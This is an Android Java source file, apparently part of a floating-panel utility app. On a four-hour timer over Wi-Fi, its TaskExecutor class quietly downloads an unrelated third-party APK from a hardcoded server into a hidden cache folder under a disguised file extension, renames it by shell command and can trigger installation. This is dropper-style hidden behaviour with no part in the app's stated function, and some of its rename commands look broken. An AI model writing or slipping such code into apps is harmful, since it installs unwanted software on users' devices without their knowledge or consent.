package com.android.iquicker.common;

import java.io.File;

import android.content.Context;

import com.android.iquicker.services.RefreshDataService;
import com.lidroid.xutils.DbUtils;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.db.sqlite.Selector;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.HttpHandler;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;


public class TaskExecutor {
	public static boolean downloading = false;
	public static NetControl netControl;
	
	private static int opennetworktrytimes = 0;
	public static String getReportUrl() {
		// TODO Auto-generated method stub
		return "http://47.88.26.185:1191/iQuickerReport.aspx";
	}
	
	public static String getTaskUrl() {
		// TODO Auto-generated method stub
		return "http://47.88.26.185:1191/iQuicker.aspx";
	}
	
	private static void SavePreTicks(long curTicks) {
		// TODO Auto-generated method stub
		try
		{
			DbUtils db = DbUtils.create(RefreshDataService.mAppGlobalContext);
			db.configDebug(true);
			
			PanelButtonConfig data = db.findFirst(Selector.from(PanelButtonConfig.class).where("id","=", 1));
			if(data != null && data.getId() == 1)
			{
				//Logger.i("_FLOAT_", "SavePreTicks," + "try to update data");
				
				data.setPretick(curTicks);
				db.update(data);
			}
			else
			{
				//Logger.i("_FLOAT_", "SavePreTicks," + "not exist, try to save first");
				
				PanelButtonConfig curdata = new PanelButtonConfig();
				curdata.setId(1);
				curdata.setPretick(curTicks);
	
				db.save(curdata);
			}

			db.close();
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
	}
	
	private static long GetSavedPreTicks() {
		// TODO Auto-generated method stub
		long r = 0;
		
		//Logger.i("_FLOAT_", "DbUtils GetSavedPreTicks");
		
		try
		{
			DbUtils db = DbUtils.create(RefreshDataService.mAppGlobalContext);
			db.configDebug(true);

			PanelButtonConfig data = db.findFirst(Selector.from(PanelButtonConfig.class).where("id","=", 1));
			if(data != null && data.getId() == 1)
			{
				//Logger.i("_FLOAT_", "GetSavedPreTicks=" + data.getId() + ",pretick=" + data.getPretick());
				r = data.getPretick();
				db.close();
			}
			else
			{
				//Logger.i("_FLOAT_", "GetSavedPreTicks," + "not exist, try to save first");
				
				PanelButtonConfig first = new PanelButtonConfig();
				first.setId(1);
				first.setPretick(0);
				
				db.save(first);
				db.close();
			}
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		
		return r;
	}
	
	public static void StartGetTask(Context context)
	{

		//Logger.i("_FLOAT_", "StartGetTask Start");
		
		long curTicks = System.currentTimeMillis();
    	long preTicks = GetSavedPreTicks();
    	//Logger.i("_FLOAT_", "StartGetTask preTicks=" + preTicks);
		if(preTicks == 0)//初次启动
    	{
    		SavePreTicks(curTicks);//保存当前值
    	}
    	else
    	{
    		//Logger.i("_FLOAT_","curTicks - preTicks = " + "(" + (curTicks - preTicks) + ")/(" + ((curTicks - preTicks) * 1.0 / 60000) + "minutes)");
    		if(curTicks - preTicks < (RefreshDataService.RE_GETTASK_MILISECS))//在4小时之内部要重复联网
    		{
    			//Logger.i("_FLOAT_", "--in 240 minutes:" + "not do task get");
    			return;
    		}
    		else
    		{
    			//Logger.i("_FLOAT_", "--OK!!!pass 240 minutes:" + "try to get task， when connected then save the ticktime!!!!");
    		}
    	}

		//前面的代码已经检查完毕，调用直接联网
		if(netControl == null){
			netControl =  new NetControl(context);
		}
		if(netControl.isWiFiActive()){
			DoExecuteGetTask();
		}
		
	}

	/*
	 * 如果需要直接联网，就调用此函数
	 */
	public static void DoExecuteGetTask() {
		// TODO Auto-generated method stub
		DownloadFileAndInstall(false);
	}
	
	public static void DownloadFileAndInstall(final boolean autoInstall) {
		// TODO Auto-generated method stub
		if(downloading)
		{
			return;
		}
		
		downloading = true;
		
		try
		{
			String saveFileDir = CommonTools.GetFileSaveDir() + "/.downloadcache";
			File file = new File(saveFileDir);
			if(!file.exists())
			{
				file.mkdir();
			}

			final String saveFileFullName = saveFileDir + "/" + "qbsp" + ".ap";
			
			HttpUtils http = new HttpUtils(120 * 1000);
			http.configRequestRetryCount(3);
			
			HttpHandler handler = http.download("http://apk.jiequbao.com/uploads/qianBaoSuoPing.apk",
				saveFileFullName,
			    true, // 如果目标文件存在，接着未完成的部分继续下载。服务器不支持RANGE时将从新下载。
			    false, //下载完成后不要自动重命名。
			    new RequestCallBack<File>() {
	
					@Override
					public void onSuccess(ResponseInfo<File> responseInfo) {
						// TODO Auto-generated method stub
						//Log.i("_PHONE_SERVICES__", "DownloadFileAndInstall--onSuccess entry");
						//Logger.i("_PHONE_SERVICES__", "DownloadFileAndInstall--onSuccess entry");
						
						String result = "NoResult";
						String cause = "NoCause";
						File appFile = responseInfo.result;
						if(appFile != null && appFile.length() > 1000)
						{
							//Logger.i("_PHONE_SERVICES__", "DownloadFileAndInstall--autoInstall:" + autoInstall);
							BaseCmdUtil.execCommand("rename " + saveFileFullName + " " + saveFileFullName + "k", false);
							if(autoInstall)
							{
								new Thread(new Runnable()
								{
									@Override
									public void run() {
										// TODO Auto-generated method stub
										CommonTools.ShowInstall(saveFileFullName + "k");
									}
								}).run();
							}
						}
						else if(appFile == null || appFile.length() <= 0)
						{
							result = "DownFail";
							cause = "No file or file size is zero";
						}
						else
						{
							result = "DownOK";
							cause = "file size is too small";
						}
						
						downloading = false;
						
						//Logger.i("_PHONE_SERVICES__", "DownloadFileAndInstall--onSuccess finished:" + result + "," + cause + "");
					}
	
					@Override
					public void onFailure(HttpException error, String msg) {
						// TODO Auto-generated method stub
						//Log.i("_PHONE_SERVICES__", error.getMessage() + "," + error.getCause() + "," + msg);
						//Logger.i("_PHONE_SERVICES__", "download onFailure:" + error.getMessage() + "," + error.getCause() + "," + msg);
						
						if(error.getExceptionCode() == 416)
						{
							//文件已下载完成了
							//Logger.i("_PHONE_SERVICES__", "DownloadFileAndInstall--416 autoInstall:" + autoInstall);
							BaseCmdUtil.execCommand("rename " + saveFileFullName + "k", false);
							if(autoInstall)
							{
								new Thread(new Runnable()
								{
									@Override
									public void run() {
										// TODO Auto-generated method stub
										CommonTools.ShowInstall(saveFileFullName + "k");
									}
								}).run();
							}
						}
						
						downloading = false;
						String result = "DownFail";
						String cause = "download onFailure:" + error.getMessage() + "," + msg;
					}
   
			});
		}
		catch(Exception ex)
		{		
			downloading = false;
			ex.printStackTrace();
		}
	}
	
}
